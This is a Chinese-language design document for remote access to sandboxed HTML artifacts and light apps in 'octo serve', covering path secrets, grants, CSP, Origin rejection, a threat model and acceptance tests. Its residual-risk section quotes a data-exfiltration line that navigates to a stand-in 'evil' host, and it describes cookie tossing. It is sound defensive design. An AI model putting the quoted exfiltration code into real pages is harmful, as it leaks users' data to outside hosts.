# Remote Content Origin：远程访问下的制品与轻应用

## 目标

- `octo serve` 部署在服务器上、经域名远程访问时，会话 HTML 制品和轻应用照样能在面板里完整运行，行为与本机一致：独立 origin、原生 `localStorage`、相对路径读同目录资产、CSP 出网边界。
- 远程访问的鉴权不依赖主界面的登录 cookie，也不依赖第三方 cookie，内容域名与主界面不同站也能用。
- 用户可以把单个轻应用标成公开，不登录也能凭链接访问。
- 本机行为不变：`<token>.artifacts.localhost` 和 `<slug>.apps.localhost` 两条路径、`isLocalPeer` 判定、现有测试全部保持原样。

## 非目标

- 不按路径区分应用（`domain.com/<slug>`）。同源于主界面等于把访问密钥交给应用脚本；共用一个专用域名则所有应用共享一个 origin，存储互相可读。
- Mobile 仍然不提供制品和轻应用（`dev-docs/artifact-origin-design.md` 的决定不变）。
- 不做 TLS 终止、证书申请、DNS 配置。这些由部署者的反向代理负责，octo 只按 `Host` 分流。
- 会话制品不做公开。公开只针对用户明确保存的轻应用。
- 不支持应用里用绝对路径（`/app.js`）引用自身资产。远程 URL 带路径前缀，绝对路径会落到前缀之外。

## 配置

```yaml
# ~/.octo/config.yml
content_origin: https://octo-content.example.net
```

`octo serve --content-origin <url>` 覆盖配置文件，优先级与 `access_key` 相同（flag > config.yml）。值是带 scheme 的 origin：scheme 只能是 `http` 或 `https`，host 非空，不带 path / query / fragment，host 不能是 `localhost` 或以 `.localhost` 结尾。不合法时 `octo serve` 启动失败并打印原因。

配置后多出两组主机名，结构与本机一一对应：

| 用途 | 本机 | 远程 |
|---|---|---|
| 会话制品 | `http://<token>.artifacts.localhost:<port>/` | `https://<token>.artifacts.<content host>/_t/<secret>/` |
| 轻应用 | `http://<slug>.apps.localhost:<port>/` | `https://<slug>.apps.<content host>/_t/<secret>/` |
| 公开轻应用 | 无 | `https://<slug>.apps.<content host>/` |

`content_origin` 带端口时远程 URL 保留该端口。

部署者需要：

- 两条通配 DNS 记录：`*.apps.<content host>`、`*.artifacts.<content host>`，指向反向代理。
- 一张覆盖两个通配名的证书（两个 SAN）。
- 反向代理把原始 `Host` 透传给 octo（nginx 需要 `proxy_set_header Host $host`），octo 靠 `Host` 分流。

**推荐内容域名使用与主界面不同的可注册域名**（主界面 `octo.example.com`，内容 `octo-content.example.net`）。同一可注册域名下（`octo.example.com` 与 `content.example.com`）也能工作，但残余风险更多，见威胁模型。

## 威胁模型

保护对象与 `artifact-origin-design.md` 相同：agent 生成的 HTML 一律视为不可信，它的脚本绝不能成为已登录的用户。远程部署下多出三个变化，本方案对每个都给出防线：

1. **内容主机名在公网可解析。** 本机方案里 token 泄漏无害，因为主机名只在本机解析到回环。远程主机名谁都能访问，所以主机名 label 不再是凭据，每个请求都必须带路径 secret（公开轻应用除外）。
2. **反向代理是回环 peer。** `isLocalPeer` 在远程主机上没有意义：代理从回环连进来并带转发头，本机信号全部失效。远程主机的 handler 不看 locality，只看 secret。
3. **同站部署时登录 cookie 会发给主界面。** `octo_access_key` 是 `SameSite=Strict`，这个属性按站点判定，不按 origin 判定。`slug.apps.example.com` 上的脚本请求 `octo.example.com/api/...` 属于同站请求，cookie 会被带上，而 `requireAuth` 对持有有效密钥的请求直接放行，不看 Origin。

防线由四条互相独立的规则构成：

1. **内容主机上没有 API。** `hostRouter` 在 mux 之前分流，远程内容主机与本机内容主机一样，`/api/*`、`/ws`、UI 静态文件一律 404。
2. **内容域名的 Origin 在主界面上是外人，持有密钥也一样。** `requireAuth` 和 `wsCheckOrigin` 在校验密钥**之前**检查 `Origin`：host 等于或以 `.apps.<content host>`、`.artifacts.<content host>` 结尾的，一律 403 forbidden origin。这条规则专门关闭上面的第 3 点，与 CSP 互为独立防线。`corsMiddleware` 不为这类 Origin 回写具体的 `Access-Control-Allow-Origin`（`--cors '*'` 本来就只回 `*`，不带凭据）。
3. **CSP 出网边界不变。** 远程响应沿用 `artifactCSP` 的 `default-src` / `script-src` / `style-src` / `form-action` / `base-uri`，只替换 `frame-ancestors`（见下文）。页面的 fetch / 图片 / 表单只能指向自身 origin 和白名单 CDN，打不到主界面。
4. **登录 cookie 是 host-only。** 前端写 cookie 不带 `Domain` 属性，浏览器不会把它发给内容主机。

路径 secret 的泄漏面，均接受：

- 应用自己的脚本读得到 `location.pathname`。secret 只授权读取这一个应用（或这一个制品目录）的资产类型文件，它本来就在读这些文件。
- 反向代理访问日志、用户在新标签页打开时的浏览器历史。与"持有链接即可读该应用"的语义一致；grant 有 24 小时滑动过期，服务重启全部失效。
- `Referer` 不会带出去：内容主机的响应已有 `Referrer-Policy: no-referrer`。
- 主机名 label（轻应用 slug、制品 token）会出现在 DNS 查询和 TLS SNI 里。它们不是凭据：slug 本来就是可猜的名字，制品 token 在远程路径上也只是 label。

残余风险：

- **同站部署下的 cookie tossing。** 内容域名与主界面同一可注册域名时，内容脚本可以写 `Domain=example.com; name=octo_access_key` 的 cookie。它不知道真实密钥，只能写一个错误值；`keyFromRequest` 取到的若是这个错误值，远程用户的请求会 401，等于拒绝服务，需要清 cookie 恢复。不同可注册域名的部署不存在这个问题，这是推荐独立域名的主要原因。
- **frame 自导航带数据**（`location.href = 'https://evil/?' + data`），与本机方案相同，CSP 无法关闭，已记录在 `SECURITY.md`。
- **公开轻应用目录对任何人可读**，范围是该应用目录下资产类型的文件。只能由用户在 UI 上显式打开。

## 服务端

### Host 分流

`hostRouter` 在现有两个本机分支之后增加远程分支：`content_origin` 已配置、且 `canonicalHost(r.Host)` 以 `.apps.<content host>` 或 `.artifacts.<content host>` 结尾时，分别进远程轻应用 handler 和远程制品 handler。label 的切分规则与本机相同：裸后缀和多级子域都算内容主机，统一 404，不落进 mux。

### 路径 secret

远程内容主机上的 URL 形如 `/_t/<secret>/<rel>`：

- `secret` 为 16 字节 `crypto/rand` 的 hex，与 grant 记录的值做常量时间比较。不匹配、grant 不存在或已过期，一律 404，不区分原因。
- `/_t/<secret>` 不带尾斜杠时 301 到带尾斜杠的形式，保证页面里的相对路径在前缀之下解析。
- `/_t/<secret>/` 和 `/_t/<secret>/index.html` 返回入口，其余 `rel` 按 `serveArtifactAsset` 的规则（资产扩展名表、`resolveAssetPath`、符号链接不出 root）服务。制品额外接受入口文件名本身，与本机一致。
- `localStorage` 按 origin 划分，与路径无关，所以前缀不影响存储持久：同一个应用换了 secret，读到的仍是同一份存储。
- 只接受 GET / HEAD。

### Grant

两个 grant 接口按客户端分三种情况返回：

| 客户端 | 返回 |
|---|---|
| `isLocalRequest` 为真，Host 不是 IPv6 字面量 | 本机 URL，行为不变 |
| 非本机，`content_origin` 已配置 | 远程 URL（带 secret） |
| 其他 | 409，前端显示不可用提示 |

**会话制品**：沿用 `POST /api/sessions/{id}/artifacts/grant`，路径校验不变。`artifactGrant` 增加 `secret` 和 `ancestor` 两个字段。远程 URL 的 label 仍是 grant 的 token。

**轻应用**：新增 `POST /api/light-apps/{slug}/grant`，返回 `{url, expires_at}`。slug 校验沿用 `handleGetLightApp`，应用目录下必须有 `index.html`，否则 404。本机客户端拿到 `http://<slug>.apps.localhost:<port>/`，不建 grant 记录，因为本机源不需要 secret。远程 grant 存在 `Server` 上的内存 map 里，结构 `{slug, secret, ancestor, lastUsed}`，24 小时滑动过期，由下一次申请顺手清理。

**grant 按 UI origin 分开。** 远程 grant 的键包含申请者的 UI origin：同一应用从两个不同地址的主界面打开，拿到两个 secret。UI origin 取自 grant 请求的 `Origin` 头，并且必须与该请求自己的 Host 同 host（`canonicalHost` 比较），否则 403；远程 grant 请求缺 `Origin` 时同样 403。这个值记为 grant 的 `ancestor`，用来生成 `frame-ancestors`。

### 远程响应头

远程内容响应沿用 `setArtifactOriginHeaders` 的全部头，只有 CSP 的 `frame-ancestors` 不同：

- 带 secret 的请求：`frame-ancestors <grant.ancestor>`，只有申请它的那个主界面能嵌入。
- 公开轻应用的无 secret 请求：`frame-ancestors 'none'`，只能顶层打开，别的网站嵌不进去。

`artifactCSP` 由常量改为按 `frame-ancestors` 值拼接的函数，本机响应的结果与现在逐字节相同。

### 公开轻应用

`manifest.json` 新增 `public` 字段（bool，缺省 false）。远程轻应用 handler 收到无 `/_t/` 前缀的请求时，若应用的 manifest `public` 为真，则按 `/` → 入口、`/<rel>` → 资产的规则服务，否则 404。公开应用的带 secret URL 照常可用，面板里始终使用带 secret 的 URL。

manifest 在每次请求时重新读取，关闭公开后立即生效，不需要重启。

公开状态只由 UI 设置：

```
PUT /api/light-apps/{slug}/public      （经 s.api 注册，requireAuth 保护）
body: { "public": true }
200: 更新后的 manifest
```

handler 读出 manifest，只改 `public` 字段后写回，其余字段原样保留。`internal/prompt/base.md` 不提这个字段，agent 不会被引导去写它。

`GET /api/light-apps` 的每个条目增加 `public`；`content_origin` 已配置时，公开的条目再带 `public_url`。

### `/api/version`

响应增加 `content_origin`（bool）：是否已配置 `content_origin`。前端用 `local || content_origin` 判断制品和轻应用在当前客户端是否可用。

## 前端

- **可用性**：`lightappsAvailable` 改为 `(localAccess && !hostIsIPv6) || contentOrigin`，`contentOrigin` 来自 `/api/version`。挂载到导航的应用（`mountedViews`）跟随同一判定。
- **轻应用 URL**：`lightappURL` 改为先调 `POST /api/light-apps/{slug}/grant` 拿基础 URL，再追加 `?theme=&v=`。基础 URL 按 slug 在页面生命周期内缓存；打开应用和点刷新按钮时重新申请，这样服务重启导致的 secret 失效在下一次刷新时自然恢复。本机客户端同样走 grant，前端只有一条路径。
- **会话制品**：`hydrateArtifact` 已经使用 grant 返回的 `url`，不需要改。`probeArtifactOrigin` 的 `no-cors` 探测对远程 https URL 同样有效。
- **不可用提示**：非本机且未配置 `content_origin` 时，提示文案改为说明需要在服务端配置 `content_origin`，并链接到用户文档。
- **公开开关**：`content_origin` 已配置时，轻应用卡片显示"公开访问"开关；公开的卡片显示公开链接和复制按钮。关闭时二次确认不需要，打开时确认一次，说明"任何拿到链接的人都能打开这个应用，包括它目录下的图片、脚本、数据文件"。
- **存储迁移**：`lightapp_bridge.js` 的迁移协议与 origin 无关（宿主按登记的 window 和 slug 路由），远程 UI 在 srcdoc 时代留在自己 IndexedDB 里的旧数据同样会迁移过去。顶层打开的公开应用 `window.parent === window`，桥脚本直接返回。

## 文档与提示词同步

- `internal/prompt/base.md` 轻应用约束：页面 origin 的描述从 `<slug>.apps.localhost` 改为"its own origin"；相对路径一条加一句"never with a leading `/`"。
- `SECURITY.md` "What is defended"：制品行补充远程内容域名；新增一行"内容域名脚本持同站 cookie 调 API"，防线为 Origin 前置拒绝 + CSP；残余风险补同站 cookie tossing 和公开轻应用。
- `dev-docs/serve-auth-design.md` 威胁模型表加同一行。
- `dev-docs/artifact-origin-design.md`、`dev-docs/light-apps-design.md`：把"只有本机可用"的描述改为"本机，或配置了 `content_origin` 的远程客户端"，并链接本文档；`light-apps-design.md` 的 manifest 字段表加 `public`。
- 用户文档 `docs/src/content/docs/guides/light-apps.mdx` 与 `docs/src/content/docs/zh/guides/light-apps.mdx`：新增"远程访问"一节，写配置项、DNS / 证书 / 反向代理要求（附 nginx 最小示例）、推荐独立域名、公开开关。

## 验收

安全部分是硬门，缺一不合：

- 未配置 `content_origin` 时，现有 `artifact_origin_test.go`、`lightapp_origin_test.go` 全部原样通过，本机 CSP 头逐字节不变。
- `Host: x.apps.<content host>` 或 `x.artifacts.<content host>` 请求 `/api/health`、`/ws`、`/`（非公开应用）、`/assets/...` → 404。
- 远程内容主机：无 secret、错误 secret、过期 grant、别的 slug 的 secret → 404；`rel` 含 `..`、符号链接出 root、扩展名不在表内 → 404。
- 带有效密钥 cookie、`Origin: https://x.apps.<content host>` 的请求打任意 `/api` → 403；同样条件的 `/ws` 升级被拒。同一密钥不带该 Origin → 200。
- 远程 grant：`Origin` 缺失或与请求 Host 不同 host → 403；两个不同 UI origin 拿到不同 secret，各自响应的 `frame-ancestors` 只含自己。
- 非本机、未配置 `content_origin`：两个 grant 接口 → 409。
- 公开：`public: false` 的应用无前缀访问 → 404；`PUT .../public` 打开后无前缀访问 → 200 且 `frame-ancestors 'none'`；关闭后立即 404。`PUT` 只改 `public`，其余字段逐字段保留。
- `content_origin` 取值为 `ftp://…`、带 path、`localhost`、`*.localhost` → `octo serve` 启动失败。
- 端到端：本地起 serve，用 `--host-resolver-rules` 把 `*.apps.test`、`*.artifacts.test` 指到 127.0.0.1，前面放一个带 `X-Forwarded-For` 的反向代理模拟远程。headless Chrome 打开主界面：轻应用面板渲染、`./app.js` 与 `./model.glb` 按相对路径加载、`localStorage` 刷新后仍在、两个应用互相读不到对方的键；会话 HTML 制品在面板中渲染；页面里 `fetch('<主界面>/api/sessions', {credentials:'include'})` 被 CSP 拦截，绕过 CSP 用 curl 带 cookie 和该 Origin 直打 → 403。

## 涉及文件

服务端：

- `internal/config/config.go`：`ContentOrigin` 字段（`content_origin`）
- `cmd/octo/serve.go`：`--content-origin` flag、启动校验
- `internal/server/server.go`：`Config.ContentOrigin`、轻应用 grant 与公开开关路由
- `internal/server/artifact_origin.go`：远程分流、`artifactGrant.secret` / `ancestor`、grant 三路返回
- `internal/server/lightapp_origin.go`：远程轻应用 handler、公开判定、轻应用 grant
- `internal/server/artifact_gate.go`：`artifactCSP` 改为按 `frame-ancestors` 拼接
- `internal/server/auth.go`：`requireAuth` / `wsCheckOrigin` 的内容域名 Origin 前置拒绝
- `internal/server/lightapps_handlers.go`：manifest `public` 字段、`PUT .../public`、列表 `public_url`
- `internal/server/version_upgrade_handlers.go`：`content_origin` 标志

前端：

- `web/src/lib/stores.ts`：`contentOrigin`、`lightappsAvailable`、`lightappURL` 改走 grant
- `web/src/lib/api.ts`：轻应用 grant、公开开关请求
- `web/src/components/layout/VersionBadge.svelte`：读取 `content_origin`
- `web/src/components/ArtifactsPanel.svelte`、`web/src/components/MountedApp.svelte`：异步 URL、不可用提示文案
- `web/src/views/LightAppsView.svelte`：公开开关与链接

文档：`SECURITY.md`、`internal/prompt/base.md`、`dev-docs/serve-auth-design.md`、`dev-docs/artifact-origin-design.md`、`dev-docs/light-apps-design.md`、`docs/src/content/docs/guides/light-apps.mdx`、`docs/src/content/docs/zh/guides/light-apps.mdx`。
